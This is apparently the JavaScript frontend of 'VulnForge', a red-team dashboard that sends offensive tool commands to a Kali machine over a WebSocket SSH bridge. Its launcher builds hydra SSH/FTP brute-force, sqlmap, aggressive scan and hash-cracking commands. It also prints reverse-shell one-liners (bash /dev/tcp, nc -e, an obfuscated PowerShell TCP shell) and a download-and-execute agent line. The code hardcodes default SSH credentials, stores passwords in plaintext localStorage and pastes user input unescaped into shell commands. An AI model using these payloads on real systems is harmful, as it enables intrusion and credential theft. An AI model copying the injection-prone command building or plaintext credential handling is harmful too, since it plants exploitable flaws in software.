/**
 * ============================================================
 *  VulnForge — Frontend Controller
 *  WebSocket · SSH · Arsenal Launcher · Connection Manager
 * ============================================================
 */

let ws;

document.addEventListener('DOMContentLoaded', () => {

    // ============================================================
    //  REFERENCIAS DOM
    // ============================================================
    const output          = document.getElementById('terminal-output');
    const statusInd       = document.getElementById('status-indicator');
    const statusText      = document.getElementById('status-text');
    const connBadge       = document.getElementById('conn-badge');
    const connTitle       = document.getElementById('terminal-title');
    const cmdInput        = document.getElementById('cmd-input');
    const btnConnect      = document.getElementById('btn-connect');
    const btnDisconnect   = document.getElementById('btn-disconnect');
    const btnSend         = document.getElementById('btn-send');
    const targetInput     = document.getElementById('target-ip');
    const connSelector    = document.getElementById('conn-selector');
    const activeConn      = document.getElementById('active-conn-display');
    const connDot         = document.getElementById('conn-dot');
    const connLabel       = document.getElementById('conn-label');

    let activeConnectionId = null;      // id de la conexión activa
    let connections = [];              // array de conexiones guardadas

    // ============================================================
    //  SALIDA EN TERMINAL
    // ============================================================
    window.appendOutput = function (text) {
        output.textContent += text + (text.endsWith('\n') ? '' : '\n');
        requestAnimationFrame(() => {
            output.scrollTop = output.scrollHeight;
        });
    };

    window.appendBanner = function () {
        appendOutput('');
        appendOutput('  ██╗   ██╗██╗   ██╗██╗     ███╗   ██╗███████╗ ██████╗ ██████╗  ██████╗ ███████╗');
        appendOutput('  ██║   ██║██║   ██║██║     ████╗  ██║██╔════╝██╔═══██╗██╔══██╗██╔════╝ ██╔════╝');
        appendOutput('  ██║   ██║██║   ██║██║     ██╔██╗ ██║█████╗  ██║   ██║██████╔╝██║  ███╗█████╗  ');
        appendOutput('  ╚██╗ ██╔╝██║   ██║██║     ██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║   ██║██╔══╝  ');
        appendOutput('   ╚████╔╝ ╚██████╔╝███████╗██║ ╚████║██║     ╚██████╔╝██║  ██║╚██████╔╝███████╗');
        appendOutput('    ╚═══╝   ╚═════╝ ╚══════╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝');
        appendOutput('  ───────────────────────────────────────────────────────────────────────────────');
        appendOutput('  🌐 Red Team Dashboard  |  🔗 vulnforge.local  |  ⚡ 24 modules loaded');
        appendOutput('  ───────────────────────────────────────────────────────────────────────────────');
        appendOutput('');
    };

    // ============================================================
    //  CONNECTION MANAGER (localStorage)
    // ============================================================
    function loadConnections() {
        try {
            const stored = localStorage.getItem('vulnforge_connections');
            connections = stored ? JSON.parse(stored) : [];
        } catch {
            connections = [];
        }
        renderConnections();
    }

    function saveConnections() {
        localStorage.setItem('vulnforge_connections', JSON.stringify(connections));
        renderConnections();
    }

    function renderConnections() {
        connSelector.innerHTML = '<option value="">-- Select target --</option>';
        connections.forEach((c, i) => {
            const opt = document.createElement('option');
            opt.value = i;
            opt.textContent = `${c.name || 'Unknown'} (${c.ip})`;
            connSelector.appendChild(opt);
        });

        // Restore active if still in list
        if (activeConnectionId !== null) {
            const exists = connections.some((_, i) => i === activeConnectionId);
            if (!exists) {
                activeConnectionId = null;
                hideActiveConn();
            } else {
                showActiveConn(connections[activeConnectionId]);
            }
        }
    }

    function showActiveConn(conn) {
        activeConn.classList.remove('hidden');
        connDot.className = 'conn-dot ' + (ws && ws.readyState === WebSocket.OPEN ? 'online' : 'offline');
        connLabel.textContent = `${conn.name} (${conn.ip})`;
    }

    function hideActiveConn() {
        activeConn.classList.add('hidden');
    }

    // ── Global: show/hide add connection form ──
    window.showAddConnection = function () {
        document.getElementById('add-conn-form').classList.remove('hidden');
    };
    window.toggleAddConnection = function () {
        document.getElementById('add-conn-form').classList.add('hidden');
    };

    // ── Global: save new connection ──
    window.saveConnection = function () {
        const name = document.getElementById('new-conn-name').value.trim();
        const ip   = document.getElementById('new-conn-ip').value.trim();
        const user = document.getElementById('new-conn-user').value.trim();
        const pass = document.getElementById('new-conn-pass').value;

        if (!name || !ip || !user || !pass) {
            alert('⚠️  Fill in all fields: Alias, IP, User, Pass');
            return;
        }

        connections.push({ name, ip, user, pass });
        saveConnections();
        showToast(`✓ Connection "${name}" saved`);

        // Reset form
        document.getElementById('new-conn-name').value = '';
        document.getElementById('new-conn-ip').value = '';
        document.getElementById('new-conn-user').value = '';
        document.getElementById('new-conn-pass').value = '';
        document.getElementById('add-conn-form').classList.add('hidden');
    };

    // ── Global: select connection from dropdown ──
    connSelector.addEventListener('change', () => {
        const idx = parseInt(connSelector.value);
        if (isNaN(idx)) return;
        activeConnectionId = idx;
        const conn = connections[idx];
        showActiveConn(conn);
        // Also update the target-ip field
        targetInput.value = conn.ip;
    });

    // ── Global: disconnect active connection ──
    window.disconnectConn = function () {
        disconnectWS();
        activeConnectionId = null;
        hideActiveConn();
        connSelector.value = '';
    };

    // ============================================================
    //  WEBSOCKET — CONEXIÓN SSH
    // ============================================================
    function connectWS() {
        if (ws && ws.readyState === WebSocket.OPEN) {
            appendOutput('[!] Already connected.');
            return;
        }

        // Use the active connection or defaults
        let sshIp = '192.168.214.142';
        let sshUser = 'javi';
        let sshPass = 'javi';

        if (activeConnectionId !== null) {
            const conn = connections[activeConnectionId];
            sshIp = conn.ip;
            sshUser = conn.user;
            sshPass = conn.pass;
            appendOutput(`[*] Connecting to ${conn.name} (${sshIp})...`);
        } else {
            appendOutput('[*] Connecting to Kali (default)...');
        }

        ws = new WebSocket('ws://localhost:8000/ws');

        ws.onopen = () => {
            statusInd.classList.replace('bg-blood', 'bg-neon');
            statusInd.style.boxShadow = '0 0 8px rgba(0,255,65,0.6)';
            statusText.textContent = 'ONLINE';
            statusText.classList.replace('text-gray-500', 'text-neon');
            if (activeConnectionId !== null) {
                connDot.className = 'conn-dot online';
                connBadge.textContent = 'connected';
            }
            connBadge.textContent = `connected: ${sshUser}@${sshIp}`;
            connTitle.textContent = `─╼ ${sshUser}@${sshIp} ╾─────────────────────────────────────`;

            // Send credentials to backend (extended protocol)
            // The backend will use them if we pass them as first message
            ws.send(JSON.stringify({ type: 'auth', ip: sshIp, user: sshUser, pass: sshPass }));
        };

        ws.onmessage = (event) => {
            // Check if message is our protocol marker
            const data = event.data;
            if (typeof data === 'string' && data.startsWith('{') && data.includes('"type"')) {
                try {
                    const msg = JSON.parse(data);
                    if (msg.type === 'connected') {
                        appendOutput(`[+] ${msg.message || 'SSH connection established'}`);
                    } else if (msg.type === 'error') {
                        appendOutput(`[!] ${msg.message || 'Unknown error'}`);
                    }
                    return;
                } catch {}
            }
            appendOutput(data);
        };

        ws.onclose = () => {
            statusInd.classList.replace('bg-neon', 'bg-blood');
            statusInd.style.boxShadow = '0 0 8px rgba(255,0,64,0.6)';
            statusText.textContent = 'OFFLINE';
            statusText.classList.replace('text-neon', 'text-gray-500');
            connBadge.textContent = 'disconnected';
            connDot.className = 'conn-dot offline';
            appendOutput('\n[!] Connection closed.');
            ws = null;
        };
    }

    function disconnectWS() {
        if (ws && ws.readyState === WebSocket.OPEN) {
            appendOutput('[*] Closing connection...');
            ws.close();
        } else {
            appendOutput('[!] No active connection.');
        }
    }

    // ============================================================
    //  ENVÍO DE COMANDOS
    // ============================================================
    window.sendCommand = function () {
        if (!ws || ws.readyState !== WebSocket.OPEN) {
            appendOutput('[!] Connect to Kali first.');
            return;
        }
        const cmd = cmdInput.value.trim();
        if (!cmd) return;
        ws.send(cmd);
        cmdInput.value = '';
    };

    window.sendPredefinedCmd = function (cmd) {
        if (!ws || ws.readyState !== WebSocket.OPEN) {
            appendOutput('[!] Connect to Kali first before launching modules.');
            return;
        }
        appendOutput(`\n▶ ${cmd}`);
        ws.send(cmd);
    };

    // ============================================================
    //  🚀 LAUNCH TOOL — ARSENAL CORE
    // ============================================================
    window.launchTool = function (tool) {
        const target = targetInput.value.trim();

        // Validate target (skip for tools that don't need it)
        const needsTarget = [
            'gobuster','dirb','wfuzz','ffuf','nikto','whatweb','wpscan',
            'nmap','masscan','netcat','dnsrecon',
            'enum4linux','smbclient',
            'hydra-ssh','hydra-ftp','sqlmap'
        ];
        if (needsTarget.includes(tool) && !target) {
            alert('⚠️  Enter a target IP/domain in the "Target_" field first.');
            targetInput.focus();
            return;
        }

        let command = '';
        let description = '';

        // ── Web Recon ──
        switch (tool) {
            case 'gobuster':
                command = `gobuster dir -u http://${target} -w /usr/share/wordlists/dirb/common.txt -t 50 -q`;
                description = 'Gobuster — directory enumeration';
                break;

            case 'dirb':
                command = `dirb http://${target} /usr/share/wordlists/dirb/common.txt`;
                description = 'Dirb — directory brute force';
                break;

            case 'wfuzz':
                command = `wfuzz -c -w /usr/share/wordlists/dirb/common.txt --hc 404 http://${target}/FUZZ`;
                description = 'Wfuzz — web fuzzing';
                break;

            case 'ffuf':
                command = `ffuf -w /usr/share/wordlists/dirb/common.txt -u http://${target}/FUZZ`;
                description = 'Ffuf — fast web fuzzer';
                break;

            case 'nikto':
                command = `nikto -h http://${target}`;
                description = 'Nikto — web vulnerability scanner';
                break;

            case 'whatweb':
                command = `whatweb ${target}`;
                description = 'WhatWeb — technology fingerprinting';
                break;

            case 'wpscan':
                command = `wpscan --url http://${target} --no-update --disable-tls-checks`;
                description = 'Wpscan — WordPress scanner';
                break;

            // ── Network ──
            case 'nmap':
                command = `nmap -p- -sV -sC -O -A --min-rate=1000 -T4 ${target}`;
                description = 'Nmap — aggressive full scan';
                break;

            case 'masscan':
                command = `masscan -p1-65535 --rate=1000 ${target}`;
                description = 'Masscan — mass port scan (65535)';
                break;

            case 'netcat':
                command = `nc -zv ${target} 21 22 23 25 53 80 110 139 143 443 445 993 995 1433 1521 2049 3306 3389 5432 5900 5985 5986 8080 8443`;
                description = 'Netcat — fast TCP scan (24 ports)';
                break;

            case 'dnsrecon':
                command = `dnsrecon -d ${target}`;
                description = 'Dnsrecon — DNS enumeration';
                break;

            // ── SMB / Windows ──
            case 'enum4linux':
                command = `enum4linux -a ${target}`;
                description = 'Enum4linux — full SMB enumeration';
                break;

            case 'smbclient':
                command = `smbclient -L //${target} -N`;
                description = 'Smbclient — list SMB shares (null session)';
                break;

            // ── Pivoting ──
            case 'ligolo':
                command = `echo "╔══════════════════════════════════════════════╗\n║  Ligolo-ng — Pivot Tunneling Guide        ║\n╚══════════════════════════════════════════════╝\n\n[+] On Kali (proxy):\n    sudo ip tuntap add user $(whoami) mode tun ligolo\n    sudo ip link set ligolo up\n    ligolo-ng proxy -selfcert\n\n[+] On Target (agent):\n    # Upload & run agent:\n    wget http://${target}:8000/agent -O /tmp/agent && chmod +x /tmp/agent && .//tmp/agent\n    # OR direct connect back:\n    ligolo-ng agent -connect ${target}:11601 -ignore-cert\n\n[+] After connection (proxy side):\n    sudo ip route add <target_subnet>/24 dev ligolo\n    # Session interactive > 'session' > 'start'\n\n[+] Ligolo-ng GitHub: https://github.com/nicocha30/ligolo-ng"`;
                description = 'Ligolo-ng — pivot agent guide';
                break;

            case 'nc-listener':
                command = `echo "╔══════════════════════════════════════════════╗\n║  Netcat Listener — Reverse Shell           ║\n╚══════════════════════════════════════════════╝\n\n[+] Start listener:\n    rlwrap nc -lvnp 4444\n\n[+] On target (send shell):\n    bash -i >& /dev/tcp/${target}/4444 0>&1\n    # OR:\n    nc -e /bin/sh ${target} 4444\n    # OR (powershell):\n    powershell -NoP -NonI -W Hidden -Exec Bypass -c \"\\$c=New-Object System.Net.Sockets.TCPClient('${target}',4444);\\$s=\\$c.GetStream();[byte[]]\\$b=0..65535|%{0};while((\\$i=\\$s.Read(\\$b,0,\\$b.Length)) -ne 0){;\\$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(\\$b,0,\\$i);\\$sb=(iex \\$d 2>&1 | Out-String );\\$sb2=\\$sb + 'PS ' + (pwd).Path + '> ';\\$sbt=([text.encoding]::ASCII).GetBytes(\\$sb2);\\$s.Write(\\$sbt,0,\\$sbt.Length);\\$s.Flush()};\\$c.Close()\"\n\n⚠️  Remember: This only shows the commands. Run the listener separately."`;
                description = 'NC Listener — reverse shell guide';
                break;

            // ── Crypto / Decode ──
            case 'jwt-decode': {
                const token = prompt('🔑 Paste your JWT token:');
                if (!token) return;
                command = `echo "${token}" | cut -d. -f2 2>/dev/null | base64 -d 2>/dev/null | python3 -m json.tool 2>/dev/null || (echo "[!] Invalid JWT payload"; echo "${token}" | cut -d. -f1 2>/dev/null | base64 -d 2>/dev/null | python3 -m json.tool 2>/dev/null || echo "[!] Could not decode header either")`;
                description = 'JWT Decode — token payload';
                break;
            }

            case 'b64-encode': {
                const text = prompt('📝 Text to encode (Base64):');
                if (!text) return;
                command = `echo -n "${text}" | base64 -w0`;
                description = 'Base64 Encode';
                break;
            }

            case 'b64-decode': {
                const b64 = prompt('🔐 Base64 string to decode:');
                if (!b64) return;
                command = `echo "${b64}" | base64 -d 2>/dev/null || echo "[!] Invalid Base64"`;
                description = 'Base64 Decode';
                break;
            }

            case 'john': {
                const hashType = prompt('🔑 Hash mode (e.g., sha512crypt, md5crypt, raw-sha256)\n> Leave empty for auto-detect:', '');
                const mode = hashType.trim() ? `--format=${hashType.trim()}` : '';
                command = `echo "⚠️  John the Ripper — Crack Guide\n\n${mode ? 'Format: ' + hashType : 'Auto-detect mode'}\n\n[+] Basic usage:\n    john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt\n    ${mode ? 'john --wordlist=/usr/share/wordlists/rockyou.txt ' + mode + ' hash.txt' : ''}\n\n[+] Show cracked:\n    john --show hash.txt\n\n[+] Unshadow (for /etc/shadow):\n    unshadow passwd.txt shadow.txt > hashes.txt\n    john hashes.txt\n\n⚠️  Upload your hash file to Kali first, then run john manually."`;
                description = 'John — hash cracker guide';
                break;
            }

            case 'hashcat': {
                const hcMode = prompt('⚡ Hashcat mode number (default: 0 = MD5)\n 0=MD5  100=SHA1  1400=SHA256  1800=sha512crypt  3200=bcrypt\n> Leave empty for MD5:', '0');
                const finalMode = hcMode.trim() || '0';
                command = `echo "⚠️  Hashcat — GPU Hash Cracking Guide\n\n[+] Mode ${finalMode} selected\n\n[+] Basic crack:\n    hashcat -m ${finalMode} -a 0 hash.txt /usr/share/wordlists/rockyou.txt\n\n[+] With rules:\n    hashcat -m ${finalMode} -a 0 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule\n\n[+] Show cracked:\n    hashcat -m ${finalMode} --show hash.txt\n\nCommon modes:\n  0 = MD5\n  100 = SHA1\n  1400 = SHA256\n  1800 = sha512crypt ($6$)\n  3200 = bcrypt\n  5500 = NetNTLMv1\n  5600 = NetNTLMv2"`;
                description = 'Hashcat — GPU hash cracker guide';
                break;
            }

            // ── Exploitation ──
            case 'hydra-ssh':
                command = `hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://${target} -t 4`;
                description = 'Hydra SSH — brute force (rockyou)';
                break;

            case 'hydra-ftp':
                command = `hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://${target} -t 4`;
                description = 'Hydra FTP — brute force (rockyou)';
                break;

            case 'sqlmap':
                command = `sqlmap -u http://${target} --batch --random-agent`;
                description = 'Sqlmap — automatic SQL injection';
                break;

            case 'searchsploit':
                command = `searchsploit ${target} 2>/dev/null || echo "[!] No results for: ${target}"`;
                description = 'Searchsploit — exploit search';
                break;

            default:
                appendOutput(`[!] Unknown tool: "${tool}"`);
                return;
        }

        // Display banner and send
        const sep = '─'.repeat(52);
        appendOutput(`\n${sep}`);
        appendOutput(`  🚀 ${description}`);
        appendOutput(`  🎯 ${target || '(no target needed)'}`);
        appendOutput(`  \$ ${command}`);
        appendOutput(`${sep}`);

        window.sendPredefinedCmd(command);
    };

    // ============================================================
    //  CATEGORY TOGGLE (collapsible sidebar)
    // ============================================================
    window.toggleCategory = function (header) {
        const body = header.nextElementSibling;
        const arrow = header.querySelector('span:first-child');
        if (body.style.display === 'none') {
            body.style.display = '';
            arrow.textContent = '▶';
        } else {
            body.style.display = 'none';
            arrow.textContent = '▼';
        }
    };

    // ============================================================
    //  TOAST NOTIFICATIONS
    // ============================================================
    function showToast(msg) {
        const existing = document.querySelector('.toast');
        if (existing) existing.remove();
        const toast = document.createElement('div');
        toast.className = 'toast';
        toast.textContent = msg;
        document.body.appendChild(toast);
        setTimeout(() => toast.remove(), 3000);
    }

    // ============================================================
    //  EVENT LISTENERS
    // ============================================================
    btnConnect.addEventListener('click', connectWS);
    btnDisconnect.addEventListener('click', disconnectWS);
    btnSend.addEventListener('click', window.sendCommand);

    cmdInput.addEventListener('keypress', (event) => {
        if (event.key === 'Enter') {
            window.sendCommand();
        }
    });

    targetInput.addEventListener('keypress', (event) => {
        if (event.key === 'Enter') {
            window.launchTool('gobuster');
        }
    });

    // ── Init ──
    loadConnections();
    window.appendBanner();
});
